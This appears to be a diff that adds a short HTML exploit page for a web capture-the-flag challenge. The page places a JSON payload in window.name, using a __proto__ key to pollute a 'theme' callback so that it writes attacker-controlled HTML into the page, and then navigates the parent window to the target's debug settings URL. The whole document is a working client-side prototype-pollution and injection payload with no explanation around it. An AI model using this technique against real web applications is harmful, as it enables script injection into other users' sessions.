@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+    x = `
+        <h1> Hello </h1>
+        
+    `
+    window.name = `{"x": ${JSON.stringify(x)}, "verbose": true, "showAll": true, "keepDebug": true, "__proto__": {"theme":{"cb":"document.body.innerHTML=window.name.valueOf"}}}`;
+    parent.location = 'https://littlethings.web.ctfcompetition.com/settings?__debug__';
+</script>
+</body>
+</html>
